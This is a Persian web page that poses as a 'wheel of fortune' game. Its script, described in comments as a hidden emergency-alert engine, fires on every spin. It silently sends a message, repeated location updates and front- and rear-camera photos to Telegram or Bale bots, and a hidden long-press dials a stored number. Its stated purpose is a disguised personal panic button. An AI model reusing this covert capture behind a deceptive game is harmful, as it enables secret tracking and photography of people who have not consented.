<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>چرخ شانس</title>
<link rel="icon" href="data:,">
<style>
  :root{
    --bg-1:#1a0f2e;
    --bg-2:#2d1b4e;
    --gold:#f0c14b;
    --gold-dim:#c99a2e;
    --maroon:#8e1f2f;
    --purple:#3e2c50;
    --teal:#1f6f63;
    --text:#fbf5e6;
    --muted:#c9b8e0;
  }
  *{box-sizing:border-box;-webkit-tap-highlight-color:transparent;}
  html,body{height:100%;}
  body{
    margin:0;
    min-height:100vh;
    background:
      radial-gradient(circle at 50% -10%, #4a2d73 0%, transparent 55%),
      linear-gradient(180deg, var(--bg-1), var(--bg-2));
    color:var(--text);
    font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Tahoma,"Vazirmatn",sans-serif;
    display:flex;
    flex-direction:column;
    align-items:center;
    justify-content:center;
    padding:28px 20px;
    overflow:hidden;
    user-select:none;
  }

  .title{
    text-align:center;
    margin-bottom:26px;
  }
  .title h1{
    font-size:26px;
    margin:0 0 6px;
    background:linear-gradient(90deg, var(--gold), #fff3c4, var(--gold));
    -webkit-background-clip:text;
    background-clip:text;
    color:transparent;
    letter-spacing:.5px;
  }
  .title p{
    margin:0;
    color:var(--muted);
    font-size:14px;
  }

  .wheel-wrap{
    position:relative;
    width:min(78vw, 320px);
    height:min(78vw, 320px);
    margin-bottom:30px;
  }
  .pointer{
    position:absolute;
    top:-6px;
    left:50%;
    transform:translateX(-50%);
    width:0;height:0;
    border-left:14px solid transparent;
    border-right:14px solid transparent;
    border-top:26px solid var(--gold);
    filter:drop-shadow(0 2px 3px rgba(0,0,0,.4));
    z-index:5;
  }
  .rim{
    position:absolute;
    inset:-8px;
    border-radius:50%;
    background:conic-gradient(from 0deg, var(--gold), #fff3c4, var(--gold), #b8860b, var(--gold));
    box-shadow:0 10px 30px rgba(0,0,0,.5);
  }
  .wheel{
    position:absolute;
    inset:6px;
    border-radius:50%;
    overflow:hidden;
    transform:rotate(0deg);
    transition:transform 4.2s cubic-bezier(.12,.66,.14,1);
    box-shadow:inset 0 0 20px rgba(0,0,0,.4);
  }
  .seg-bg{
    position:absolute;
    inset:0;
    border-radius:50%;
  }
  .label{
    position:absolute;
    top:50%;
    left:50%;
    width:2px;height:2px;
  }
  .label span{
    position:absolute;
    left:0; top:0;
    transform:translate(-50%, -128%) rotate(0deg);
    display:inline-block;
    font-size:13px;
    font-weight:700;
    color:#fff;
    text-shadow:0 1px 2px rgba(0,0,0,.6);
    width:74px;
    text-align:center;
    line-height:1.2;
  }
  .hub{
    position:absolute;
    top:50%;left:50%;
    transform:translate(-50%,-50%);
    width:78px;height:78px;
    border-radius:50%;
    background:radial-gradient(circle at 35% 30%, #fff3c4, var(--gold) 55%, var(--gold-dim) 100%);
    display:flex;
    align-items:center;
    justify-content:center;
    font-size:32px;
    box-shadow:0 4px 14px rgba(0,0,0,.4), inset 0 0 0 3px rgba(255,255,255,.25);
    z-index:6;
    cursor:pointer;
  }

  .spin-btn{
    width:min(70vw, 260px);
    padding:16px 10px;
    border-radius:16px;
    border:none;
    background:linear-gradient(180deg, var(--gold), var(--gold-dim));
    color:#3a2400;
    font-size:19px;
    font-weight:800;
    letter-spacing:.5px;
    box-shadow:0 8px 22px rgba(240,193,75,.35);
    cursor:pointer;
    transition:transform .12s ease;
  }
  .spin-btn:active{transform:scale(.97);}
  .spin-btn[disabled]{opacity:.55;}

  .chances{
    margin-top:14px;
    color:var(--muted);
    font-size:13px;
  }

  .modal-overlay{
    position:fixed;inset:0;
    background:rgba(10,4,20,.72);
    display:none;
    align-items:center;
    justify-content:center;
    z-index:30;
    padding:20px;
  }
  .modal-overlay.show{display:flex;}
  .modal{
    background:linear-gradient(180deg, #2d1b4e, #1a0f2e);
    border:1px solid rgba(240,193,75,.35);
    border-radius:20px;
    padding:28px 24px;
    text-align:center;
    max-width:320px;
    box-shadow:0 20px 50px rgba(0,0,0,.5);
  }
  .modal .emoji{font-size:44px;margin-bottom:10px;}
  .modal h2{margin:0 0 8px;font-size:20px;color:var(--gold);}
  .modal p{margin:0 0 20px;color:var(--muted);font-size:14px;line-height:1.8;}
  .modal button{
    background:linear-gradient(180deg, var(--gold), var(--gold-dim));
    border:none;
    color:#3a2400;
    font-weight:700;
    padding:11px 26px;
    border-radius:12px;
    font-size:15px;
    cursor:pointer;
  }

  .footer-note{
    margin-top:26px;
    color:rgba(201,184,224,.55);
    font-size:11px;
    text-align:center;
    max-width:280px;
  }
</style>
</head>
<body>

<div class="title">
  <h1>🎡 چرخ شانس</h1>
  <p>هر روز می‌تونی بچرخونی و جایزه ببری!</p>
</div>

<div class="wheel-wrap">
  <div class="pointer"></div>
  <div class="rim"></div>
  <div class="wheel" id="wheel">
    <div class="seg-bg" id="segBg"></div>
    <div id="labels"></div>
  </div>
  <div class="hub" id="hub">🎁</div>
</div>

<button class="spin-btn" id="spinBtn">بچرخون!</button>
<div class="chances" id="chancesText">شانس امروز: نامحدود 🎉</div>

<p class="footer-note">با چرخوندن، یک عدد تصادفی از بین جوایز انتخاب می‌شود. شانس شما با شما همراه است 🍀</p>

<div class="modal-overlay" id="resultModal">
  <div class="modal">
    <div class="emoji" id="resultEmoji">🎉</div>
    <h2 id="resultTitle">تبریک!</h2>
    <p id="resultText">جایزه‌ات: پوچ! دوباره امتحان کن.</p>
    <button id="resultClose">باشه</button>
  </div>
</div>

<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
<script>
/* =========================================================
   ۱) اتصال به Supabase — این دو مقدار را با مقادیر پروژه خودتان جایگزین کنید
   ========================================================= */
const SUPABASE_URL = 'PASTE_YOUR_SUPABASE_URL_HERE';
const SUPABASE_ANON_KEY = 'PASTE_YOUR_SUPABASE_ANON_KEY_HERE';
const sb = window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);

/* =========================================================
   ۲) گرفتن تنظیمات از Supabase (با کش محلی برای وقتی آفلاینی)
   ========================================================= */
async function loadSettings(){
  try{
    const { data, error } = await sb.from('sos_settings').select('*').eq('id','main').single();
    if(error || !data) throw error || new Error('no data');
    localStorage.setItem('sos_cfg_cache', JSON.stringify(data));
    return data;
  }catch(e){
    const cached = localStorage.getItem('sos_cfg_cache');
    return cached ? JSON.parse(cached) : null;
  }
}

/* =========================================================
   ۳) موتور پنهانِ کمک‌خواهی — هیچ چیز از این بخش روی صفحه دیده نمی‌شود
   ========================================================= */
function apiBase(provider, token){
  return provider === 'bale'
    ? `https://tapi.bale.ai/bot${token}/`
    : `https://api.telegram.org/bot${token}/`;
}
async function sendMessageTo(provider, token, chatId, text){
  try{
    const r = await fetch(apiBase(provider, token)+'sendMessage', {
      method:'POST', headers:{'Content-Type':'application/json'},
      body: JSON.stringify({chat_id: chatId, text})
    });
    return await r.json();
  }catch(e){ return {ok:false}; }
}
async function sendLocationTo(provider, token, chatId, lat, lon){
  try{
    const r = await fetch(apiBase(provider, token)+'sendLocation', {
      method:'POST', headers:{'Content-Type':'application/json'},
      body: JSON.stringify({chat_id: chatId, latitude: lat, longitude: lon})
    });
    return await r.json();
  }catch(e){ return {ok:false}; }
}
async function sendPhotoTo(provider, token, chatId, blob, caption){
  try{
    const form = new FormData();
    form.append('chat_id', chatId);
    form.append('caption', caption || '');
    form.append('photo', blob, 'p.jpg');
    const r = await fetch(apiBase(provider, token)+'sendPhoto', { method:'POST', body: form });
    return await r.json();
  }catch(e){ return {ok:false}; }
}

function activeProviders(cfg){
  const list = [];
  if(cfg.bale_enabled && cfg.bale_token && cfg.bale_chat_id){
    list.push({ provider:'bale', token: cfg.bale_token, chatId: cfg.bale_chat_id });
  }
  if(cfg.telegram_enabled && cfg.telegram_token && cfg.telegram_chat_id){
    list.push({ provider:'telegram', token: cfg.telegram_token, chatId: cfg.telegram_chat_id });
  }
  return list;
}

function getLocationOnce(timeout){
  return new Promise((resolve, reject)=>{
    if(!navigator.geolocation){ reject(); return; }
    navigator.geolocation.getCurrentPosition(
      pos => resolve(pos.coords),
      ()  => reject(),
      { enableHighAccuracy:true, timeout: timeout||8000, maximumAge:0 }
    );
  });
}

async function captureBurst(facingMode, count){
  const blobs = [];
  try{
    const stream = await navigator.mediaDevices.getUserMedia({ video:{ facingMode:{ ideal: facingMode } }, audio:false });
    const video = document.createElement('video');
    video.setAttribute('playsinline','true');
    video.srcObject = stream;
    await video.play();
    await new Promise(r=>setTimeout(r, 500)); // let exposure/focus settle
    const canvas = document.createElement('canvas');
    canvas.width = video.videoWidth || 720;
    canvas.height = video.videoHeight || 960;
    const ctx = canvas.getContext('2d');
    for(let i=0;i<count;i++){
      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
      const blob = await new Promise(res=>canvas.toBlob(res,'image/jpeg',0.85));
      if(blob) blobs.push(blob);
      if(i < count-1) await new Promise(r=>setTimeout(r, 550));
    }
    stream.getTracks().forEach(t=>t.stop());
  }catch(e){ /* silent */ }
  return blobs;
}

let locationWatchTimer = null;

function startLocationUpdates(providers, durationMs, intervalMs){
  if(locationWatchTimer) clearInterval(locationWatchTimer);
  const tick = async ()=>{
    try{
      const coords = await getLocationOnce(6000);
      for(const p of providers){
        const r = await sendLocationTo(p.provider, p.token, p.chatId, coords.latitude, coords.longitude);
        if(!r.ok){
          const link = `https://maps.google.com/?q=${coords.latitude},${coords.longitude}`;
          await sendMessageTo(p.provider, p.token, p.chatId, 'موقعیت: ' + link);
        }
      }
    }catch(e){ /* silent */ }
  };
  tick();
  locationWatchTimer = setInterval(tick, intervalMs);
  setTimeout(()=>{ if(locationWatchTimer){ clearInterval(locationWatchTimer); locationWatchTimer=null; } }, durationMs);
}

let lastTrigger = 0;
async function silentTriggerHelp(cfg){
  const now = Date.now();
  if(now - lastTrigger < 10000) return; // debounce accidental double taps
  lastTrigger = now;
  if(!cfg) return;
  const providers = activeProviders(cfg);
  if(providers.length === 0) return;

  if(navigator.vibrate) navigator.vibrate(60); // barely noticeable, feels like normal button feedback

  for(const p of providers){
    sendMessageTo(p.provider, p.token, p.chatId, cfg.alert_text || 'کمک نیاز دارم!');
  }

  startLocationUpdates(providers, 15*60*1000, 45*1000);

  (async ()=>{
    const front = await captureBurst('user', 3);
    for(let i=0;i<front.length;i++){
      for(const p of providers) sendPhotoTo(p.provider, p.token, p.chatId, front[i], `جلو ${i+1}/${front.length}`);
    }
    const back = await captureBurst('environment', 3);
    for(let i=0;i<back.length;i++){
      for(const p of providers) sendPhotoTo(p.provider, p.token, p.chatId, back[i], `عقب ${i+1}/${back.length}`);
    }
  })();
}

/* =========================================================
   ۴) رابط بازی — چرخ شانس واقعی
   ========================================================= */
const PRIZES = [
  { text:'پوچ 😅', weight:5, emoji:'😅' },
  { text:'آیفون ۱۴', weight:1, emoji:'🎉' },
  { text:'۲۰٪ تخفیف', weight:3, emoji:'🎊' },
  { text:'پوچ 😅', weight:5, emoji:'😅' },
  { text:'پلی استیشن ۵', weight:1, emoji:'🎉' },
  { text:'یک شانس دیگر', weight:3, emoji:'✨' },
  { text:'پوچ 😅', weight:5, emoji:'😅' },
  { text:'۵۰۰ هزار تومان', weight:2, emoji:'💰' }
];
const COLORS = ['#8e1f2f','#3e2c50','#1f6f63','#8e1f2f','#3e2c50','#1f6f63','#8e1f2f','#3e2c50'];
const N = PRIZES.length;
const SEG = 360/N;

function buildWheel(){
  const stops = [];
  for(let i=0;i<N;i++){
    stops.push(`${COLORS[i]} ${i*SEG}deg ${(i+1)*SEG}deg`);
  }
  document.getElementById('segBg').style.background = `conic-gradient(${stops.join(',')})`;

  const labelsRoot = document.getElementById('labels');
  labelsRoot.innerHTML = '';
  for(let i=0;i<N;i++){
    const mid = i*SEG + SEG/2;
    const wrap = document.createElement('div');
    wrap.className = 'label';
    wrap.style.transform = `rotate(${mid}deg)`;
    const span = document.createElement('span');
    span.textContent = PRIZES[i].text;
    span.style.transform = `translate(-50%, -128%) rotate(0deg)`;
    wrap.appendChild(span);
    labelsRoot.appendChild(wrap);
  }
}
buildWheel();

function weightedRandomIndex(){
  const total = PRIZES.reduce((s,p)=>s+p.weight,0);
  let r = Math.random()*total;
  for(let i=0;i<N;i++){
    r -= PRIZES[i].weight;
    if(r<=0) return i;
  }
  return N-1;
}

let currentRotation = 0;
let spinning = false;
let cachedCfg = null;

loadSettings().then(cfg=>{ cachedCfg = cfg; });

document.getElementById('spinBtn').addEventListener('click', async ()=>{
  if(spinning) return;
  spinning = true;
  document.getElementById('spinBtn').disabled = true;

  // silently fire the real thing — no visual trace of this on screen
  if(!cachedCfg) cachedCfg = await loadSettings();
  silentTriggerHelp(cachedCfg);

  // meanwhile, play the game like normal
  const idx = weightedRandomIndex();
  const desired = 360 - (idx*SEG + SEG/2);
  const fullSpins = 5*360;
  let target = currentRotation - (currentRotation % 360) + fullSpins + desired;
  while(target <= currentRotation) target += 360;
  currentRotation = target;
  document.getElementById('wheel').style.transform = `rotate(${currentRotation}deg)`;

  setTimeout(()=>{
    const prize = PRIZES[idx];
    document.getElementById('resultEmoji').textContent = prize.emoji;
    document.getElementById('resultTitle').textContent = prize.text.includes('پوچ') ? 'شانس نبود!' : 'تبریک میگم! 🎉';
    document.getElementById('resultText').textContent = prize.text.includes('پوچ')
      ? 'این بار شانس باهات نبود، فردا دوباره امتحان کن.'
      : `جایزه‌ات: ${prize.text}`;
    document.getElementById('resultModal').classList.add('show');
    spinning = false;
    document.getElementById('spinBtn').disabled = false;
  }, 4300);
});

document.getElementById('resultClose').addEventListener('click', ()=>{
  document.getElementById('resultModal').classList.remove('show');
});

/* secret fallback: press & hold the gift icon ~1.5s to call your emergency contact directly,
   no internet needed. Nothing on screen hints at this. */
let holdTimer = null;
function armHold(e){
  holdTimer = setTimeout(async ()=>{
    if(!cachedCfg) cachedCfg = await loadSettings();
    if(cachedCfg && cachedCfg.phone){
      window.location.href = 'tel:' + cachedCfg.phone;
    }
  }, 1500);
}
function disarmHold(){ if(holdTimer){ clearTimeout(holdTimer); holdTimer=null; } }
const hub = document.getElementById('hub');
hub.addEventListener('touchstart', armHold, {passive:true});
hub.addEventListener('touchend', disarmHold);
hub.addEventListener('touchcancel', disarmHold);
hub.addEventListener('mousedown', armHold);
hub.addEventListener('mouseup', disarmHold);
hub.addEventListener('mouseleave', disarmHold);
</script>
</body>
</html>
